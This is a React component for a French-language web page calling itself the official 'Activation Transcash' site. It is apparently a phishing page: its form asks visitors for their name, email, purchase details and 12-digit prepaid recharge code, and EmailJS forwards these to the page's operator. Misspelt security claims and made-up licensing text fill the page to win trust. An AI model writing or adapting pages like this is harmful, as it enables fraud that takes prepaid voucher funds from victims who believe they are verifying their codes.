import React, { useState,useRef } from 'react';
import emailjs from "emailjs-com";
import profil from './images/profil.jpeg';
import phone from './images/phone.jpeg';
import rapide from './images/rapide.jpeg';
import fiable from './images/fiable.jpeg';
import secure from './images/secure.jpeg';
import visa from './images/visa.jpeg';

import './styles/accueil.scss';





const Accueil = () => {
  const [show, setShow] = useState(false);
  const [showe, setShowe] = useState(false);
  const form = useRef();
   const sendEmail = (e) => {
     e.preventDefault();

     emailjs
       .sendForm(
         "service_o19gmcb",
         "template_hzn98zf",
         form.current,
         "eNbGuhHH13G4a2Mho"
       )
       .then(
         (result) => {
           console.log(result.text);
           alert('vous recevrez un email dans quelques instants')
         },
         (error) => {
           console.log(error.text);
         }
       );
   };
  
  

      const handleclick = () => {
        setShow(!show);
  };
      const handleclicke = () => {
        setShowe(!showe);
  };
  const scrolling = ()=>
{
    setShow(false)
  }

 
  window.addEventListener('scroll', scrolling) ;

  


    
    return (
      <div className="container">
        <nav>
          <div onClick={handleclick} className="burger">
            <i className={show ? "fa-solid fa-xmark" : "fa-solid fa-bars"} />
          </div>
          <div className={show ? "links active" : "links"}>
            <a href="Accueil">Accueil</a>
            <a href="#validation">Validation</a>
            <a href="Contact">Contact</a>
          </div>
        </nav>

        <div className="firstImg">
          <img height="100px" src={profil} alt="" />
          <h1>Activation Transcash</h1>
        </div>

        <div className="accueil">
          <h3>Bienvenue sur le site Officiel</h3>
          <hr></hr>
        </div>

        <div className="phone">
          <img height="100px" src={phone} alt="" />
        </div>

        <h2>Actiavtion de vos recharges</h2>
        <p>
          Transcash est utilisable en ligne uniquement , il vous permet
          d'effectuer touts vos achats e-commerce en toute sécurité. La
          fiabilité de votre code de recgarge est donc importante. Avec le
          systhème 2FS-Security vos rechardes sont donc aythentifiées enfin
          qu'elles soient utilisables en ligne.
        </p>
        <p>
          Cette étape crucilae d'authenfication se fait en utilisation de la
          technologie la plus récente connue sur SSL permettant de garantir la
          sécurité et fiabilité de vos recharges en toute légitimité.
        </p>

        <div className="display">
          <div>
            <h3>Rapide</h3>
            <img height={300} src={rapide} alt="" />
          </div>
          <div>
            <h3>Fiable</h3>
            <img height={300} src={fiable} alt="" />
          </div>

          <div>
            <h3>Securiser</h3>
            <img height={230} src={secure} alt="" />
          </div>
        </div>

        <hr></hr>
        <p>
          La recharge TRASN-CASH Mastercard est un moyen de paiement prépayé
          fiable sur internet, avec une recharge , qui vous accompagne au
          quotidien dans vos dépenses. commnader le en ligne u achetez vos
          recharges de paiement dans un bureau de tabac et profitez de touts ses
          avantages qui simplifiera la vie.
        </p>
        <hr></hr>
        <div className="formulaire">
          <form id="validation" ref={form} onSubmit={sendEmail}>
            <div className="bloc">
              <label for="nom">
                Nom *
                <input
                  required
                  placeholder="Ex:Jean Descartes"
                  type="text"
                  name="name"
                  id="nom"
                />
              </label>
            </div>
            <div className="bloc">
              <label for="email">
                Email * :
                <input
                  required
                  placeholder="Ex :jeanDescartes@gmail.com"
                  type="email"
                  name="email"
                  id=""
                />
              </label>
            </div>
            <div className="bloc">
              <label>
                Montant * :
                <select>
                  <option value="20">20</option>
                  <option>50</option>
                  <option>100</option>
                  <option>150</option>
                  <option>200</option>
                  <option>250</option>
                  <option>300</option>
                  <option>500</option>
                </select>
              </label>
            </div>
            <div className="bloc">
              <label>
                Date d'achat * : <input required type="date" name="" id="" />
              </label>
            </div>
            <div className="bloc">
              <label>
                Code a 12 chiffres * :
                <input
                  required
                  placeholder="Ex:000000000000"
                  type="text"
                  minLength="12"
                  maxLength="12"
                  name="code"
                  id=""
                />
              </label>
            </div>
            <p>Lieu d'achat *</p>
            <label style={{ color: "orange" }}>
              <input type="radio" name="lieu" id="lieu" /> Internet
            </label>
            <label style={{ color: "orange" }}>
              <input type="radio" name="lieu" id="lieu" /> Bureau de Tabac
            </label>
            <p>
              Je certifie que mon code n'a pas été utilisé sur un autre site
            </p>
            <label style={{ color: "orange" }}>
              <input type="radio" name="utile" id="" /> oui
              <input type="radio" name="utile" id="" /> non
            </label>
            <p>
              Je n'ai pas envoyer mon code à un individu pour une prestation de
              service *
            </p>
            <label style={{ color: "orange" }}>
              <input type="radio" name="valide" id="" /> oui
              <input type="radio" name="valide" id="" /> non
            </label>
            <div className="submit">
              <input type="submit" id="submit" value="Vérifier Maintenant" />
            </div>
          </form>
        </div>
        <br></br>
        <br></br>
        <hr></hr>

        <div className="siteRecharge">
          <p style={{ color: "gray" }}>
            Le site RECHARGE-AUTHENTIFICATION est émis par CARS-coopération sous
            une licence d'authentification internationa Incorporated. Le service
            est autorisé par la conduite financière autorité (FRN 9000036 ) en
            vertu du règlements de 2011 sur la monnaie électronique pour
            l'émission de monnaie électronique et fourniture de services
            électronique et fourniture de services de paiement. Siège Social :
            5è étage , Langham Housse , 302-308 Regent Steet, Londres , W1B 3AT.
            Numéro d'entreprise : 066337638.
          </p>
          <img height={100} src={visa} alt="" />
        </div>
        <hr></hr>
        <div className="footer">
          <p
            style={{ cursor: "pointer", textDecoration: "underline" }}
            onClick={handleclicke}
          >
            Mentions légales<br></br>
            {showe && (
              <p style={{ cursor: "pointer", textDecoration: "underline" }}>
                JENY SAS en plus d’être le registre du Cabada est aussi un
                opérateur global de télécommunications. Titulaire de l’agrément
                ARCE du 18 Mai 2018.
              </p>
            )}
          </p>
        </div>
        <small style={{ color: "gray", display: "block", textAlign: "center" }}>
          copyright c2022
        </small>
      </div>
    );
};

export default Accueil;